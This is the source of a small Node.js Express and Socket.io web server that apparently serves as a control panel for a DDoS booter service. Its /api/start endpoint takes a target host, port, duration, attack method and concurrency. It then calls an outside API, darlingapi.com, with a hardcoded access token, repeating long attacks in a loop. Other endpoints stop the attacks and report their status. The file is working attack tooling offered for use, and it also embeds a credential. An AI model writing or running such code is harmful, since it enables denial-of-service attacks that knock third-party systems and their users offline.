const express = require('express');
const axios = require('axios');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);
const PORT = 3000;

app.use(express.static('public'));
app.use(express.json());


io.on('connection', (socket) => {
    console.log('A user connected');
    
    socket.on('disconnect', () => {
        console.log('A user disconnected');
    });
});

app.post('/api/start', async (req, res) => {
    const { host, port, time, method, concurrents } = req.body;
    const token = 'af1f1818-3541-411f-a643-db88e2c575ff';
    const maxTime = 2700;
    const repetitions = Math.ceil(time / maxTime);

    
    try {
        for (let i = 0; i < repetitions; i++) {
            for (let j = 0; j < concurrents; j++) {
                const url = `https://darlingapi.com?token=${token}&host=${host}&port=${port}&time=${maxTime}&method=${method}`;
                console.log(`Sending request: ${url}`);
                await axios.get(url);
            }
            io.emit('status', { currentRepetition: i + 1, totalRepetitions: repetitions });
            if (i < repetitions - 1) {
                await new Promise(resolve => setTimeout(resolve, maxTime * 1000));
            }
        }
        res.status(200).send('Requests completed successfully');
    } catch (error) {
        console.error('Error making requests:', error);
        res.status(500).send('Error making requests');
    }
});

app.post('/api/stop', async (req, res) => {
  const url = `https://darlingapi.com/stop_all?token=af1f1818-3541-411f-a643-db88e2c575ff`;
                console.log(`Stop Attacks`);
                await axios.get(url);
            
            io.emit('status', { currentRepetition: 0, totalRepetitions: 0 });
})

app.get('/api/status', async (req, res) => {
    const token = 'af1f1818-3541-411f-a643-db88e2c575ff';
    try {
        const response = await axios.get(`https://darlingapi.com/status?token=${token}`);
        res.json(response.data);
    } catch (error) {
        console.error('Error fetching status:', error);
        res.status(500).send('Error fetching status');
    }
});

server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
